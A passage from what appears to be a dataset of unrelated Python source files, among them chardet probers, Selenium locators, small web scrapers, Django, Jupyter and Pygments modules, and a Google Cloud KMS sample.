# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super(CP949Prober, self).__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
JY197	JY197-locators.py	"from selenium.webdriver.common.by import By


class BasePageLocators():
    LOGIN_LINK = (By.CSS_SELECTOR, ""#login_link"")
    LOGIN_LINK_INVALID = (By.CSS_SELECTOR, ""#login_link_inc"")  # for checking the correct error message


class MainPageLocators():
    pass


class LoginPageLocators():
    LOGIN_EMAIL = (By.CSS_SELECTOR, ""[name='login-username']"")
    LOGIN_PASSWORD = (By.CSS_SELECTOR, ""[name='login-password']"")
    FORGOT_PASSWORD_BUTTON = (By.CSS_SELECTOR, 'a[href*=""password-reset""]')
    LOGIN_BUTTON = (By.CSS_SELECTOR, ""[name='login_submit']"")
    SIGN_UP_EMAIL = (By.CSS_SELECTOR, ""[name='registration-email']"")
    SIGN_UP_PASSWORD = (By.CSS_SELECTOR, ""[name='registration-password1']"")
    SIGN_UP_PASSWORD_REPETITION = (By.CSS_SELECTOR, ""[name='registration-password2']"")
    SIGN_UP_BUTTON = (By.CSS_SELECTOR, ""[name='registration_submit']"")


class ProductPageLocators():
    PRODUCT_NAME = (By.CSS_SELECTOR, "".product_main > h1"")
    ADD_TO_BASKET_BUTTON = (By. CSS_SELECTOR, "".btn-add-to-basket"")
    ADD_TO_WISHLIST_BUTTON = (By.CSS_SELECTOR, "".btn-wishlist"")
    PRODUCT_GALLERY = (By.CSS_SELECTOR, ""#product_gallery"")
    PRODUCT_DESCRIPTION = (By.CSS_SELECTOR, ""#product_description"")
    PRICE = (By.CSS_SELECTOR, "".product_main > .price_color"")
    AVAILABILITY = (By.CSS_SELECTOR, "".product_main > .availability"")
    WRITE_REVIEW = (By.CSS_SELECTOR, ""#write_review"")
    PRODUCT_INFO_TABLE = (By.CSS_SELECTOR, "".table-striped"")
    SUCCESS_MESSAGE = (By.CSS_SELECTOR, ""#messages > .alert-success:nth-child(1)"")
    NAME_OF_ADDED_PRODUCT = (By.CSS_SELECTOR, ""div.alert:nth-child(1) strong"")
    TOTAL_PRICE = (By.CSS_SELECTOR, "".alertinner p strong"")


class BasketPageLocators():
    VIEW_BASKET = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")
    VIEW_BASKET_INVALID = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")  # for checking the correct error message
    EMPTY_BASKET_MESSAGE = (By.CSS_SELECTOR, ""#content_inner > p"")
    FILLED_BASKET = (By.CSS_SELECTOR, "".basket-items"")"
JD205	JD205-easy.py	"'''  получить:
1. Наименование всех телефонов
2. Цену каждого продукта(в KGS)
3. И ссылка к фотографии
4. Все это записать в CSV файл '''
import requests
from bs4 import BeautifulSoup as BS
import csv
import time
def write_to_csv(data):
    with open('data_easy.csv', 'a') as file:
        write = csv.writer(file)
        write.writerow([data['alo'],data['price'],data['image']])
def get_html(url):
    responce = requests.get(url)
    return responce.text
def get_total_pages(html):
    soup = BS(html, 'lxml')
    page_list = soup.find('div',class_='pager-wrap').find('ul',class_='pagination pagination-sm').find_all('li')
    last_page = page_list[-1].text
    # print(last_page)
    return int(last_page)
def get_data(html):
    soup = BS(html, 'lxml')
    contents = soup.find('div', class_= 'list-view').find_all('div', class_='item product_listbox oh')
    for content in contents:
        alo = content.find('div', class_='listbox_title oh').text
        price = content.find('div', class_= 'listbox_price text-center').find('strong').text
        image = 'https://www.kivano.kg' + str(content.find('div', class_= 'listbox_img pull-left').find('img').get('src'))
        data = {'alo':alo,'price':price,'image':image}
        write_to_csv(data)
        # print (alo,price,image)
with open('data_easy.csv', 'w') as file:
    write = csv.writer(file)
    write.writerow(['alo','price','image'])
def main():
    url = 'https://www.kivano.kg/mobilnye-telefony'
    html = get_html(url)
    pages = '?page='
    get_data(html)
    number = get_total_pages(html)
    for i in range (2, number+1):
        url_with_page = url + pages + str(i)
        print (i)
        # print(url_with_page)
        html = get_html(url_with_page)
        get_data(html)

while True:
    main()
    time.sleep(3600) 
"
JY162	JY162-test_clipboard_multiselect.py	"""""""Tests clipboard by copying, cutting and pasting multiple cells""""""


from .utils import TREE_PAGE, EDITOR_PAGE


# Optionally perfom this test with Ctrl+c and Ctrl+v
def test_clipboard_multiselect(prefill_notebook):
    notebook = prefill_notebook(['', '1', '2', '3', '4', '5a', '6b', '7c', '8d'])

    assert notebook.get_cells_contents() == ['', '1', '2', '3', '4', '5a', '6b', '7c', '8d']

    # Copy the first 3 cells
    # Paste the values copied from the first three cells into the last 3 cells 

    # Selecting the fist 3 cells
    notebook.select_cell_range(1, 3)

    # Copy those selected cells
    notebook.try_click_selector('#editlink', page=EDITOR_PAGE)
    notebook.try_click_selector('//*[@id=""copy_cell""]/a/span[1]', page=EDITOR_PAGE)

    # Select the last 3 cells
    notebook.select_cell_range(6, 8)

    # Paste the cells in clipboard onto selected cells
    notebook.try_click_selector('#editlink', page=EDITOR_PAGE)
    notebook.try_click_selector('//*[@id=""paste_cell_replace""]/a', page=EDITOR_PAGE)

    assert notebook.get_cells_contents() == ['', '1', '2', '3', '4', '5a', '1', '2', '3']

    # Select the last four cells, cut them and paste them below the first cell

    # Select the last 4 cells
    notebook.select_cell_range(5, 8)

    # Click Edit button and the select cut button
    notebook.try_click_selector('#editlink', page=EDITOR_PAGE)
    notebook.try_click_selector('//*[@id=""cut_cell""]/a', page=EDITOR_PAGE)

    # Select the first cell
    notebook.select_cell_range(0, 0)

    # Paste the cells in our clipboard below this first cell we are focused at
    notebook.try_click_selector('#editlink', page=EDITOR_PAGE)
    notebook.try_click_selector('//*[@id=""paste_cell_below""]/a/span[1]', page=EDITOR_PAGE)

    assert notebook.get_cells_contents() == ['', '5a', '1', '2', '3', '1', '2', '3', '4']"
JY522	JY522-ugg_tierlist_scraper.py	"from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import csv
import time

url = ""https://u.gg/lol/tier-list""

options = Options()
options.add_argument(""--headless"") # Run Chrome in headless mode
service = Service(""chromedriver.exe"") # Path to your Chromedriver executable
driver = webdriver.Chrome(service=service, options=options)

driver.get(url)

file = open(""Tierlist.csv"", 'w')
writer = csv.writer(file)

wait = WebDriverWait(driver, 10)
wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, ""div.rt-tr-group"")))

champions = []
win_rates = []
pick_rates = []

writer.writerow(['Champion Name', 'Win rate', 'Pick Rate'])

while True:
    # Scroll to the bottom of the page
    driver.execute_script(""window.scrollTo(0, document.body.scrollHeight);"")
    time.sleep(1)
    
    # Scroll back to the top of the page
    driver.execute_script(""window.scrollTo(0, 0);"")
    time.sleep(1)
    
    # Check if all rows have been loaded
    rows = driver.find_elements(By.CSS_SELECTOR, ""div.rt-tr-group"")
    if len(rows) == len(champions):
        break
    
    # Otherwise, continue to extract the data
    for i in range(len(champions), len(rows)):
        row = rows[i]
        champion = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(3)"").get_attribute(""textContent"")
        win_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(5)"").text.strip()
        pick_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(6)"").text.strip()
            
        champions.append(champion)
        win_rates.append(win_rate)
        pick_rates.append(pick_rate)

        writer.writerow([champion, win_rate, pick_rate])

print(champions)
print(win_rates)
print(pick_rates)

driver.quit()"
JY100	JY100-__init__.py	"""""""
Caching framework.

This package defines set of cache backends that all conform to a simple API.
In a nutshell, a cache is a set of values -- which can be any object that
may be pickled -- identified by string keys.  For the complete API, see
the abstract BaseCache class in django.core.cache.backends.base.

Client code should use the `cache` variable defined here to access the default
cache backend and look up non-default cache backends in the `caches` dict-like
object.

See docs/topics/cache.txt for information on the public API.
""""""
from django.core import signals
from django.core.cache.backends.base import (
    BaseCache,
    CacheKeyWarning,
    InvalidCacheBackendError,
    InvalidCacheKey,
)
from django.utils.connection import BaseConnectionHandler, ConnectionProxy
from django.utils.module_loading import import_string

__all__ = [
    ""cache"",
    ""caches"",
    ""DEFAULT_CACHE_ALIAS"",
    ""InvalidCacheBackendError"",
    ""CacheKeyWarning"",
    ""BaseCache"",
    ""InvalidCacheKey"",
]

DEFAULT_CACHE_ALIAS = ""default""


class CacheHandler(BaseConnectionHandler):
    settings_name = ""CACHES""
    exception_class = InvalidCacheBackendError

    def create_connection(self, alias):
        params = self.settings[alias].copy()
        backend = params.pop(""BACKEND"")
        location = params.pop(""LOCATION"", """")
        try:
            backend_cls = import_string(backend)
        except ImportError as e:
            raise InvalidCacheBackendError(
                ""Could not find backend '%s': %s"" % (backend, e)
            ) from e
        return backend_cls(location, params)


caches = CacheHandler()

cache = ConnectionProxy(caches, DEFAULT_CACHE_ALIAS)


def close_caches(**kwargs):
    # Some caches need to do a cleanup at the end of a request cycle. If not
    # implemented in a particular backend cache.close() is a no-op.
    caches.close_all()


signals.request_finished.connect(close_caches)"
JY7	JY7-gb2312prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import GB2312DistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import GB2312_SM_MODEL


class GB2312Prober(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)
        self.distribution_analyzer = GB2312DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""GB2312""

    @property
    def language(self) -> str:
        return ""Chinese"""
JD439	JD439-memcache.py	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample App Engine application demonstrating how to use the Namespace Manager
API with Memcache.

For more information, see README.md.
""""""

# [START all]
from google.appengine.api import memcache
from google.appengine.api import namespace_manager
import webapp2


class MemcacheCounterHandler(webapp2.RequestHandler):
    """"""Increments counters in the global namespace as well as in whichever
    namespace is specified by the request, which is arbitrarily named 'default'
    if not specified.""""""

    def get(self, namespace='default'):
        global_count = memcache.incr('counter', initial_value=0)

        # Save the current namespace.
        previous_namespace = namespace_manager.get_namespace()
        try:
            namespace_manager.set_namespace(namespace)
            namespace_count = memcache.incr('counter', initial_value=0)
        finally:
            # Restore the saved namespace.
            namespace_manager.set_namespace(previous_namespace)

        self.response.write('Global: {}, Namespace {}: {}'.format(
            global_count, namespace, namespace_count))


app = webapp2.WSGIApplication([
    (r'/memcache', MemcacheCounterHandler),
    (r'/memcache/(.*)', MemcacheCounterHandler)
], debug=True)
# [END all]"
JY166	JY166-nbjson.py	"""""""Read and write notebooks in JSON format.""""""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import copy
import json

from ..notebooknode import from_dict
from .rwbase import (
    NotebookReader,
    NotebookWriter,
    rejoin_lines,
    split_lines,
    strip_transient,
)


class BytesEncoder(json.JSONEncoder):
    """"""A JSON encoder that accepts b64 (and other *ascii*) bytestrings.""""""

    def default(self, obj):
        if isinstance(obj, bytes):
            return obj.decode(""ascii"")
        return json.JSONEncoder.default(self, obj)


class JSONReader(NotebookReader):
    def reads(self, s, **kwargs):
        """"""Read a JSON string into a Notebook object""""""
        nb = json.loads(s, **kwargs)
        nb = self.to_notebook(nb, **kwargs)
        return nb

    def to_notebook(self, d, **kwargs):
        """"""Convert a disk-format notebook dict to in-memory NotebookNode

        handles multi-line values as strings, scrubbing of transient values, etc.
        """"""
        nb = from_dict(d)
        nb = rejoin_lines(nb)
        nb = strip_transient(nb)
        return nb


class JSONWriter(NotebookWriter):
    def writes(self, nb, **kwargs):
        """"""Serialize a NotebookNode object as a JSON string""""""
        kwargs[""cls""] = BytesEncoder
        kwargs[""indent""] = 1
        kwargs[""sort_keys""] = True
        kwargs[""separators""] = ("","", "": "")
        kwargs.setdefault(""ensure_ascii"", False)
        # don't modify in-memory dict
        nb = copy.deepcopy(nb)
        if kwargs.pop(""split_lines"", True):
            nb = split_lines(nb)
        nb = strip_transient(nb)
        return json.dumps(nb, **kwargs)


_reader = JSONReader()
_writer = JSONWriter()

reads = _reader.reads
read = _reader.read
to_notebook = _reader.to_notebook
write = _writer.write
writes = _writer.writes"
JD375	JD375-002_tkinter_aritmatika.py	"import tkinter as tk
from functools import partial

def pertambahan (labelhasil, bil1, bil2):
    b1 = int(bil1.get())
    b2 = int(bil2.get())
    hasil = b1 + b2
    
    # config digunakan untuk mengakses object atribut setelah inisialisasi
    labelhasil.config(text=hasil)
    return
    
root = tk.Tk()
# 400x200 adalah lebar dan tinggi
# 500 adalah posisi secara horizontal
# 200 adalah posisi secara vertikal
root.geometry(""400x200+500+200"")
    
# mengubah font
root.option_add(""font"", (""Verdana"", 10, ""normal""))
    
# Menampilkan title di window border
root.title('Aritmatika')

# configure untuk mengubah warna
# root.configure(bg= ""#FFFFF"")

labelbilangan1 = tk.Label(root, text= ""Masukkan Bilangan 1"")
labelbilangan1.grid(row=0, column=0, padx=(10,20))
labelbilangan2 = tk.Label(root, text=""Masukkan Bilangan 2"")
labelbilangan2.grid(row=1, column=0, padx=(10,20))
# StringVar() digunakan untuk menampung inputan tipe String
bilangan1 = tk.StringVar()
bilangan2 = tk.StringVar()

inputBilangan1 = tk.Entry(root, textvariable=bilangan1)
inputBilangan1.grid(row=0, column=1)
inputBilangan2 = tk.Entry(root, textvariable=bilangan2)
inputBilangan2.grid(row=1, column=1)

labelHasil = tk.Label(root)
labelHasil.grid(row=2, column=1)

# Functools.partial untuk membuat fungsi baru atau versi baru dengan argumen
pertambahan = partial(pertambahan, labelHasil, bilangan1, bilangan2)
tombolTambah = tk.Button(root, text = ""Tambah"", command=pertambahan)
# sticky digunakan untuk penyesuaian widget di dalam cell
# sticky=""W"" yang artinya adalah West adalah posisi widget di kiri (di dalam cell)
# sticky=""E"" yang artinya adalah East adalah posisi widget di kanan (di dalam cell)
# sticky = ""WE"" artinya memenuhi cell atau alignment rata penuh
# padx adalah padding horizontal
# pady adalah padding vertikal

tombolTambah.grid(row=2, column=0, sticky=""WE"", padx=(10,20), pady=(5,0))
tombolTambah.config(bg=""#000"", fg=""#fff"")

root.mainloop()"
JY270	JY270-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scattersmith.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY130	JY130-adapter.py	"from MySQLdb.constants import FIELD_TYPE

from django.contrib.gis.gdal import OGRGeomType
from django.db.backends.mysql.introspection import DatabaseIntrospection


class MySQLIntrospection(DatabaseIntrospection):
    # Updating the data_types_reverse dictionary with the appropriate
    # type for Geometry fields.
    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()
    data_types_reverse[FIELD_TYPE.GEOMETRY] = ""GeometryField""

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # In order to get the specific geometry type of the field,
            # we introspect on the table definition using `DESCRIBE`.
            cursor.execute(""DESCRIBE %s"" % self.connection.ops.quote_name(table_name))
            # Increment over description info until we get to the geometry
            # column.
            for column, typ, null, key, default, extra in cursor.fetchall():
                if column == description.name:
                    # Using OGRGeomType to convert from OGC name to Django field.
                    # MySQL does not support 3D or SRIDs, so the field params
                    # are empty.
                    field_type = OGRGeomType(typ).django
                    field_params = {}
                    break
        return field_type, field_params

    def supports_spatial_index(self, cursor, table_name):
        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB.
        storage_engine = self.get_storage_engine(cursor, table_name)
        if storage_engine == ""InnoDB"":
            if self.connection.mysql_is_mariadb:
                return True
            return self.connection.mysql_version >= (5, 7, 5)
        return storage_engine in (""MyISAM"", ""Aria"")"
JD397	JD397-get_key_version_attestation.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and


# [START kms_get_key_version_attestation]
def get_key_version_attestation(project_id, location_id, key_ring_id, key_id, version_id):
    """"""
    Get an HSM-backend key's attestation.

    Args:
        project_id (string): Google Cloud project ID (e.g. 'my-project').
        location_id (string): Cloud KMS location (e.g. 'us-east1').
        key_ring_id (string): ID of the Cloud KMS key ring (e.g. 'my-key-ring').
        key_id (string): ID of the key to use (e.g. 'my-key').
        version_id (string): ID of the version to use (e.g. '1').

    Returns:
        Attestation: Cloud KMS key attestation.

    """"""

    # Import the client library.
    from google.cloud import kms

    # Import base64 for printing the attestation.
    import base64

    # Create the client.
    client = kms.KeyManagementServiceClient()

    # Build the key version name.
    key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, version_id)

    # Call the API.
    version = client.get_crypto_key_version(request={'name': key_version_name})

    # Only HSM keys have an attestation. For other key types, the attestion
    # will be None.
    attestation = version.attestation
    if not attestation:
        raise 'no attestation - attestations only exist on HSM keys'

    encoded_attestation = base64.b64encode(attestation.content)
    print('Got key attestation: {}'.format(encoded_attestation))
    return attestation
# [END kms_get_key_version_attestation]"
JY385	JY385-compat.py	"# -*- coding: utf-8 -*-

""""""
requests.compat
~~~~~~~~~~~~~~~

This module handles import compatibility issues between Python 2 and
Python 3.
""""""

import chardet

import sys

# -------
# Pythons
# -------

# Syntax sugar.
_ver = sys.version_info

#: Python 2.x?
is_py2 = (_ver[0] == 2)

#: Python 3.x?
is_py3 = (_ver[0] == 3)

try:
    import simplejson as json
except ImportError:
    import json

# ---------
# Specifics
# ---------

if is_py2:
    from urllib import (
        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,
        proxy_bypass, proxy_bypass_environment, getproxies_environment)
    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag
    from urllib2 import parse_http_list
    import cookielib
    from Cookie import Morsel
    from StringIO import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import Callable, Mapping, MutableMapping, OrderedDict


    builtin_str = str
    bytes = str
    str = unicode
    basestring = basestring
    numeric_types = (int, long, float)
    integer_types = (int, long)

elif is_py3:
    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag
    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment
    from http import cookiejar as cookielib
    from http.cookies import Morsel
    from io import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import OrderedDict
    from collections.abc import Callable, Mapping, MutableMapping

    builtin_str = str
    str = str
    bytes = bytes
    basestring = (str, bytes)
    numeric_types = (int, float)
    integer_types = (int,)"
JY457	JY457-test_common.py	"import numpy as np
import pytest

from pandas.core.dtypes import dtypes
from pandas.core.dtypes.common import is_extension_array_dtype

import pandas as pd
import pandas._testing as tm
from pandas.core.arrays import ExtensionArray


class DummyDtype(dtypes.ExtensionDtype):
    pass


class DummyArray(ExtensionArray):
    def __init__(self, data) -> None:
        self.data = data

    def __array__(self, dtype):
        return self.data

    @property
    def dtype(self):
        return DummyDtype()

    def astype(self, dtype, copy=True):
        # we don't support anything but a single dtype
        if isinstance(dtype, DummyDtype):
            if copy:
                return type(self)(self.data)
            return self

        return np.array(self, dtype=dtype, copy=copy)


class TestExtensionArrayDtype:
    @pytest.mark.parametrize(
        ""values"",
        [
            pd.Categorical([]),
            pd.Categorical([]).dtype,
            pd.Series(pd.Categorical([])),
            DummyDtype(),
            DummyArray(np.array([1, 2])),
        ],
    )
    def test_is_extension_array_dtype(self, values):
        assert is_extension_array_dtype(values)

    @pytest.mark.parametrize(""values"", [np.array([]), pd.Series(np.array([]))])
    def test_is_not_extension_array_dtype(self, values):
        assert not is_extension_array_dtype(values)


def test_astype():

    arr = DummyArray(np.array([1, 2, 3]))
    expected = np.array([1, 2, 3], dtype=object)

    result = arr.astype(object)
    tm.assert_numpy_array_equal(result, expected)

    result = arr.astype(""object"")
    tm.assert_numpy_array_equal(result, expected)


def test_astype_no_copy():
    arr = DummyArray(np.array([1, 2, 3], dtype=np.int64))
    result = arr.astype(arr.dtype, copy=False)

    assert arr is result

    result = arr.astype(arr.dtype)
    assert arr is not result


@pytest.mark.parametrize(""dtype"", [dtypes.CategoricalDtype(), dtypes.IntervalDtype()])
def test_is_extension_array_dtype(dtype):
    assert isinstance(dtype, dtypes.ExtensionDtype)
    assert is_extension_array_dtype(dtype)"
JY48	JY48-big5prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Communicator client code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import Big5DistributionAnalysis
from .mbcssm import BIG5_SM_MODEL


class Big5Prober(MultiByteCharSetProber):
    def __init__(self):
        super(Big5Prober, self).__init__()
        self.coding_sm = CodingStateMachine(BIG5_SM_MODEL)
        self.distribution_analyzer = Big5DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""Big5""

    @property
    def language(self):
        return ""Chinese"""
JD195	JD195-pointless.py	"""""""
    pygments.lexers.pointless
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Pointless.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words
from pygments.token import Comment, Error, Keyword, Name, Number, Operator, \
    Punctuation, String, Text

__all__ = ['PointlessLexer']


class PointlessLexer(RegexLexer):
    """"""
    For Pointless source code.

    .. versionadded:: 2.7
    """"""

    name = 'Pointless'
    url = 'https://ptls.dev'
    aliases = ['pointless']
    filenames = ['*.ptls']

    ops = words([
        ""+"", ""-"", ""*"", ""/"", ""**"", ""%"", ""+="", ""-="", ""*="",
        ""/="", ""**="", ""%="", ""|>"", ""="", ""=="", ""!="", ""<"", "">"",
        ""<="", "">="", ""=>"", ""$"", ""++"",
    ])

    keywords = words([
        ""if"", ""then"", ""else"", ""where"", ""with"", ""cond"",
        ""case"", ""and"", ""or"", ""not"", ""in"", ""as"", ""for"",
        ""requires"", ""throw"", ""try"", ""catch"", ""when"",
        ""yield"", ""upval"",
    ], suffix=r'\b')

    tokens = {
        'root': [
            (r'[ \n\r]+', Text),
            (r'--.*$', Comment.Single),
            (r'""""""', String, 'multiString'),
            (r'""', String, 'string'),
            (r'[\[\](){}:;,.]', Punctuation),
            (ops, Operator),
            (keywords, Keyword),
            (r'\d+|\d*\.\d+', Number),
            (r'(true|false)\b', Name.Builtin),
            (r'[A-Z][a-zA-Z0-9]*\b', String.Symbol),
            (r'output\b', Name.Variable.Magic),
            (r'(export|import)\b', Keyword.Namespace),
            (r'[a-z][a-zA-Z0-9]*\b', Name.Variable)
        ],
        'multiString': [
            (r'\\.', String.Escape),
            (r'""""""', String, '#pop'),
            (r'""', String),
            (r'[^\\""]+', String),
        ],
        'string': [
            (r'\\.', String.Escape),
            (r'""', String, '#pop'),
            (r'\n', Error),
            (r'[^\\""]+', String),
        ],
    }"
JD150	JD150-driveid.py	"import os
import re
print(""\n\n""\
      ""        Bot can search files recursively, but you have to add the list of drives you want to search.\n""\
      ""        Use the following format: (You can use 'root' in the ID in case you wan to use main drive.)\n""\
      ""        teamdrive NAME      -->   anything that you likes\n""\
      ""        teamdrive ID        -->   id of teamdrives in which you likes to search ('root' for main drive)\n""\
      ""        teamdrive INDEX URL -->   enter index url for this drive.\n"" \
      ""                                  go to the respective drive and copy the url from address bar\n"")
msg = ''
if os.path.exists('list_drives.txt'):
    with open('list_drives.txt', 'r+') as f:
        lines = f.read()
    if not re.match(r'^\s*$', lines):
        print(lines)
        print(""\n\n""\
              ""      DO YOU WISH TO KEEP THE ABOVE DETAILS THAT YOU PREVIOUSLY ADDED???? ENTER (y/n)\n""\
              ""      IF NOTHING SHOWS ENTER n"")
        while 1:
            choice = input()
            if choice in ['y', 'Y']:
                msg = f'{lines}'
                break
            elif choice in ['n', 'N']:
                break
            else:
                print(""\n\n      DO YOU WISH TO KEEP THE ABOVE DETAILS ???? y/n <=== this is option ..... OPEN YOUR EYES & READ..."")
num = int(input(""    How Many Drive/Folder You Likes To Add : ""))
for count in range(1, num + 1):
    print(f""\n        > DRIVE - {count}\n"")
    name  = input(""    Enter Drive NAME  (anything)     : "")
    id    = input(""    Enter Drive ID                   : "")
    index = input(""    Enter Drive INDEX URL (optional) : "")
    if not name or not id:
        print(""\n\n        ERROR : Dont leave the name/id without filling."")
        exit(1)
    name=name.replace("" "", ""_"")
    if index:
        if index[-1] == ""/"":
            index = index[:-1]
    else:
        index = ''
    msg += f""{name} {id} {index}\n""
with open('list_drives.txt', 'w') as file:
    file.truncate(0)
    file.write(msg)
print(""\n\n    Done!"")"
JY190	JY190-test_ipdoctest.py	"""""""Tests for the ipdoctest machinery itself.

Note: in a file named test_X, functions whose only test is their docstring (as
a doctest) and which have no test functionality of their own, should be called
'doctest_foo' instead of 'test_foo', otherwise they get double-counted (the
empty function call is counted as a test, which just inflates tests numbers
artificially).
""""""

def doctest_simple():
    """"""ipdoctest must handle simple inputs
    
    In [1]: 1
    Out[1]: 1

    In [2]: print(1)
    1
    """"""

def doctest_multiline1():
    """"""The ipdoctest machinery must handle multiline examples gracefully.

    In [2]: for i in range(4):
       ...:     print(i)
       ...:      
    0
    1
    2
    3
    """"""

def doctest_multiline2():
    """"""Multiline examples that define functions and print output.

    In [7]: def f(x):
       ...:     return x+1
       ...: 

